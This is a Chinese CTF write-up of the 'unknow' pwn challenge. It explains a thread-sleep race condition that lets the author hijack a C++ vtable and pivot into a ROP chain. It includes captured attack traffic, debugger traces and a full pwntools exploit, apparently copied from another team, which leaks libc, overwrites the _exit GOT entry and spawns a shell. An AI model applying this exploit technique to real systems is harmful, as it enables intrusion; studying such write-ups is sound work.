# unknow

这题第一天在最后两轮的时候被`Vidar team`的师傅解出来了，orz，然后打了全场，但是这样就有了流量（又可以抄作业了.jpg

晚上回去爆肝看这题，但是由于太菜，流量没复现成功，把条件竞争的漏洞补上了，但是第二天还是一直被`Nu1l`打，疯狂扣分。。。

赛后交流的时候，阿鹏师傅说流量包里有个地方时间戳多了1秒，写脚本的时候要调用下`sleep` ，然后还向他要了份`exp`，但是后来想想还是自己先在看看把，实在不行在看`exp`

这题我只看到了一个漏洞，（应该还有其它的漏洞

选项2是在线程里跑

```c
 while ( 1 )
  {
    while ( 1 )
    {
      v4 = get_choice();
      if ( v4 != 1 )
        break;
      sub_407690();
    }
    if ( v4 != 2 )
      _exit(0);
    pthread_create(&newthread, 0LL, (void *(*)(void *))start_routine, 0LL);
  }
```

然后跑的函数里

```c
 do
    {
      v2 = 0;
      if ( nanosleep(&remaining, &remaining) == -1 )//  sleep 1 second!!!!
        v2 = *__errno_location() == 4;
      result = v2;
    }
    while ( v2 );
```

可以看到`sleep`了一秒，稳稳地条件竞争

那这个条件竞争会影响啥呢

```c

void *__fastcall start_routine(void *a1)
{
  void *result; // rax
  unit *v2; // rax
  unit *current; // [rsp+10h] [rbp-20h]
  int v4; // [rsp+1Ch] [rbp-14h]
  char v5; // [rsp+20h] [rbp-10h]
  unit *start; // [rsp+28h] [rbp-8h]

  start = (unit *)sub_420D90(&vectors);		//	!!!!
  v4 = 1000;
  sub_420E90(&v5, &v4);
  sub_420DC0((__int64)&v5);			//sleep 1 second
  while ( 1 )
  {
    current = (unit *)sub_420EF0(&vectors);
    result = (void *)sub_420EB0((unit *)&start, (__int64)&current);
    if ( !((unsigned __int8)result & 1) )
      break;
    v2 = (unit *)sub_420F20((__int64)&start);
    (*(void (__fastcall **)(__int64, unit **))(*(_QWORD *)v2->vtable + 0x10LL))(v2->vtable, &current);
    sub_420F40((__int64 *)&start, 0);
  }
  return result;
}
```

我们可以看到`start_routine`函数里对`vectors`进行了操作，在`sleep`前取出了放在`vectors`里的首地址，然而这个`vectors`是全局变量，意味着我们可以在线程`sleep`的时候修改他，这里也就是漏洞产生的原因，如果能伪造`vtable`的话，意味着我们就可以控制程序流程了，然后就是怎么触发这个漏洞了。

题目涉及到的结构体

```c
00000000 vector          struc ; (sizeof=0x18, mappedto_17)
00000000                                         ; XREF: .bss:vectors/r
00000000 start           dq ?
00000008 current         dq ?
00000010 end             dq ?
00000018 vector          ends
00000018
00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Rela. PRESS CTRL-
00000000
00000000 unit            struc ; (sizeof=0x18, mappedto_18)
00000000 vtable          dq ?
00000008 buffer_ptr      dq ?
00000010 buffer_len      dq ?
00000018 unit            ends
```

我们知道`vector`空间不足时会进行扩容，1,2,4,8....以此类推，相对应的在堆中申请的堆块大小为`0x20`,`0x20`,`0x30`,`0x50`.....

只要我们先创建4个`unit`对象，然后在调用功能2，在跑线程的时候，我们在创建一个`unit`对象，`buffer_len`为`0x20`，就会把原先的`vevtor`释放，然后`buffer`申请的空间刚刚好就是原先`vector`的空间，这样在调用

```c
v2 = (unit *)sub_420F20((__int64)&start);
(*(void (__fastcall **)(__int64, unit **))(*(_QWORD *)v2->vtable + 0x10LL))(v2->vtable, &current);
```

```asm
.text:0000000000407879                 call    sub_420F20
.text:000000000040787E                 mov     rax, [rax]
.text:0000000000407881                 mov     rcx, [rax]
.text:0000000000407884                 mov     rdi, rax
.text:0000000000407887                 call    qword ptr [rcx+10h]
```

我们就会有一次机会

比赛第一天晚上就是卡在这里了。。不知道应该`call`哪里，看了流量(比赛第一天晚上死活看不出来)，我才恍然大悟

流量大概长这样

```
1
128
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.y@......................
1
80
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
1
80
aaaaaaaaaaaaaaaa..E.............................................................
1
32
dddddddddddddddddddddddddddddddd
2
1
53248
ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc(一堆c)
1
32
.
J.....xaaaaaaa........................................................................
echo shell
cat flag
//一堆c后面跟了这一串，很明显是ROP
0000CE8F  63 63 63 4d 33 42 00 00  00 00 00 d8 ef 6e 00 00   cccM3B.. .....n..
0000CE9F  00 00 00 20 72 40 00 00  00 00 00 4d 33 42 00 00   ... r@.. ...M3B..
0000CEAF  00 00 00 00                                        ....
0000CEB3  f6 6e 00 00 00 00 00 7b  32 42 00 00 00 00 00 40   .n.....{ 2B.....@
0000CEC3  f3 6e 00 00 00 00 00 53  b1 4b 00 00 00 00 00 08   .n.....S .K......
0000CED3  00 00 00 00 00 00 00 90  3c 40 00 00 00 00 00 d1   ........ <@......
0000CEE3  79 40 00 00 00 00 00 10  56 40 00 00 00 00 00 31   y@...... V@.....1
//当时这里看不懂
0000D164  31 0a                                              1.
0000D166  33 32 0a                                           32.
0000D169  c0 0d 4a 00 00 00 00 00  78                        ..J..... x
```

调试了许久：

```c
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0x17f2790 —▸ 0x4a0dc0 —▸ 0x6ee1e0 —▸ 0x7fbfa879d1b0 (__cxxabiv1::__class_type_info::~__class_type_info()) ◂— mov    rax, qword ptr [rip + 0x2f17f9]
 RBX  0x0
 RCX  0x17f2790 —▸ 0x4a0dc0 —▸ 0x6ee1e0 —▸ 0x7fbfa879d1b0 (__cxxabiv1::__class_type_info::~__class_type_info()) ◂— mov    rax, qword ptr [rip + 0x2f17f9]
 RDX  0x1
 RDI  0x7fbfa7d63ee8 —▸ 0x17f2790 —▸ 0x4a0dc0 —▸ 0x6ee1e0 —▸ 0x7fbfa879d1b0 (__cxxabiv1::__class_type_info::~__class_type_info()) ◂— ...
 RSI  0x7fbfa7d63ed0 —▸ 0x17ff978 ◂— 0x0
 R8   0x7fbfa7d64700 ◂— 0x7fbfa7d64700
 R9   0x7fbfa7d64700 ◂— 0x7fbfa7d64700
 R10  0x7
 R11  0x0
 R12  0x7fbfa7d63fc0 ◂— 0x0
 R13  0x0
 R14  0x0
 R15  0x7fff65d56510 —▸ 0x405610 ◂— xor    ebp, ebp
 RBP  0x7fbfa7d63ef0 ◂— 0x0
 RSP  0x7fbfa7d63ec0 ◂— 0x0
 RIP  0x40787e ◂— mov    rax, qword ptr [rax]
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x40787e    mov    rax, qword ptr [rax]
   0x407881    mov    rcx, qword ptr [rax]
   0x407884    mov    rdi, rax
   0x407887    call   qword ptr [rcx + 0x10]
 
   0x40788a    xor    esi, esi
   0x40788c    lea    rdi, [rbp - 8]
   0x407890    call   0x420f40
 
   0x407895    mov    qword ptr [rbp - 0x28], rax
   0x407899    jmp    0x407848
 
   0x40789e    add    rsp, 0x30
   0x4078a2    pop    rbp
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0x7fbfa7d63ec0 ◂— 0x0
... ↓
02:0010│ rsi  0x7fbfa7d63ed0 —▸ 0x17ff978 ◂— 0x0
03:0018│      0x7fbfa7d63ed8 ◂— 0x3e800000000
04:0020│      0x7fbfa7d63ee0 ◂— 0x3e8
05:0028│ rdi  0x7fbfa7d63ee8 —▸ 0x17f2790 —▸ 0x4a0dc0 —▸ 0x6ee1e0 —▸ 0x7fbfa879d1b0 (__cxxabiv1::__class_type_info::~__class_type_info()) ◂— ...
06:0030│ rbp  0x7fbfa7d63ef0 ◂— 0x0
07:0038│      0x7fbfa7d63ef8 —▸ 0x7fbfa8a9c6db (start_thread+219) ◂— mov    qword ptr fs:[0x630], rax
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0           40787e
   f 1     7fbfa8a9c6db start_thread+219
Breakpoint *0x000000000040787E
pwndbg> telescope 0x17f2790
00:0000│ rax rcx  0x17f2790 —▸ 0x4a0dc0 —▸ 0x6ee1e0 —▸ 0x7fbfa879d1b0 (__cxxabiv1::__class_type_info::~__class_type_info()) ◂— mov    rax, qword ptr [rip + 0x2f17f9]
01:0008│          0x17f2798 —▸ 0x17f2678 —▸ 0x17f2730 ◂— 0x6161616161616161 ('aaaaaaaa')
02:0010│          0x17f27a0 —▸ 0x17f2670 —▸ 0x4a0da0 —▸ 0x420fc0 ◂— push   rbp
03:0018│          0x17f27a8 —▸ 0x17f2710 —▸ 0x4a0da0 —▸ 0x420fc0 ◂— push   rbp
04:0020│          0x17f27b0 ◂— 0x0
05:0028│          0x17f27b8 ◂— 0x31 /* '1' */
06:0030│          0x17f27c0 ◂— 0x6464646464646464 ('dddddddd')
```

首先是`0x4a0dc0`这个地址，它刚好指向`0x6ee1e0`，而`0x6ee1e0`也是个`vtable`,而`[0x6ee1e0]`处的函数啥也没干就是单纯的返回

```asm
 ► 0x7fbfa879fb40    xor    eax, eax
   0x7fbfa879fb42    ret    
```

这样的话就会调用第二个对象的`vtable`，而`exp`里的

```py
	cmd(1)
	p.recvuntil("size:")
	p.sendline(str(0x20))
	p.recvuntil("Data:")
	p.send(p64(0x4a0dc0)+'\x78')
	sleep(1)
```
把第二个对象的地址`partial overwrite`，还`sleep`了1秒，这样我们可以看到第二个对象的`vtable`指向了一个我们一开始申请的`buffer`里，

```c
pwndbg> telescope 0x17f2730
00:0000│   0x17f2730 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓
02:0010│   0x17f2740 —▸ 0x45d9ca ◂— and    al, 0x18
03:0018│   0x17f2748 ◂— 0x0
... ↓
pwndbg> x/4i 0x45d9ca
   0x45d9ca:	and    al,0x18
   0x45d9cc:	add    al,0xf
   0x45d9ce:	xchg   esp,eax
   0x45d9cf:	ret    0xd020
```

执行完这个后就可以`ROP`了，这也就是为什么流量里一堆`ccccc`,太精妙了，`Vidar`的师傅tql，orz

顺便我还学到了点c++的`ROP`

抄的exp为：

```python
from pwn import *

context.arch = 'amd64'

def cmd(command):
	p.recvuntil("Options:")
	p.sendline(str(command))
def add(sz,content):
	cmd(1)
	p.recvuntil("size:")
	p.sendline(str(sz))
	p.recvuntil("Data:")
	p.send(content)
def show(name):
	cmd(1)
	p.recvuntil("Please input your name first: ")
	p.sendline(name)
def dele(idx):
	cmd(2)
	p.recvuntil("Idx: ")
	p.sendline(str(idx))

def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./unknow_bak")
		# gdb.attach(p,"b *0x0000000000405610")
		# gdb.attach(p)
	payload = "a"*0x67+p64(0x4079d1)+'\x00'*17
	add(0x80,payload)
	add(80,"b"*80)
	payload = "a"*0x10+p64(0x45d9ca)+"\x00"*0x38
	add(80,payload)
	add(0x20,"d"*0x20)
	cmd(2)
	# 0x000000000042334d: pop rdi; ret; 
	# 0x000000000042327b: pop rsi; ret; 
	# 00000000004079D1		ret
	# .rodata:00000000004BB153                 pop rdx;retn
	# 0x0000000006EEFD8 __libc_start_main_ptr dq offset __libc_start_main
	# 0x000000000407220  cout << str;
	# :00000000006EF600 _ZSt3cin        dq ?  
	# .got.plt:00000000006EF340 off_6EF340      dq offset _exit         ; DATA XREF: __exit
	# .plt:0000000000403C90 __ZNSi4readEPcl proc near               ; CODE XREF: sub_407690+81
	# .plt:0000000000403C90                                         ; sub_407690+96
	# .plt:0000000000403C90                 jmp     cs:off_6EF278
	# .plt:0000000000403C90 __ZNSi4readEPcl endp
	# text:0000000000405610 start  
	read_from_cin = 0x000000000403C90
	exit_got = 0x6EF340
	cin = 0x0000000006EF600
	p_rdi = 0x000000000042334d
	p_rsi = 0x000000000042327b
	p_rdx = 0x00000000004BB153
	ret = 0x4079d1
	start_func = 0x405610
	payload = 'c'*0xcd2f+p64(p_rdi)+p64(0x0000000006EEFD8)
	payload += p64(0x000000000407220)+p64(p_rdi)
	payload += p64(cin) + p64(p_rsi)
	payload += p64(exit_got) + p64(p_rdx)+p64(8)
	payload += p64(read_from_cin) + p64(ret) + p64(start_func)
	payload = payload.ljust(0xd000,"\x00")
	add(0xd000,payload)
	cmd(1)
	p.recvuntil("size:")
	p.sendline(str(0x20))
	p.recvuntil("Data:")
	p.send(p64(0x4a0dc0)+'\x78')
	sleep(0.9)
	libc.address = u64(p.recv(6).ljust(8,"\x00"))-libc.symbols["__libc_start_main"]
	info("libc : " + hex(libc.address))
	p.send("A"*0x17+p64(libc.address+0x10a38c))
	try:
		p.recvuntil("Welcome")
		p.recvuntil("Options:")
		p.sendline('3')
		p.interactive()
	except Exception,err:
		print err
		p.kill()
	
	
if __name__ == "__main__":
	libc = ELF("./libc.so.6",checksec=False)
	main(args["REMOTE"])
```




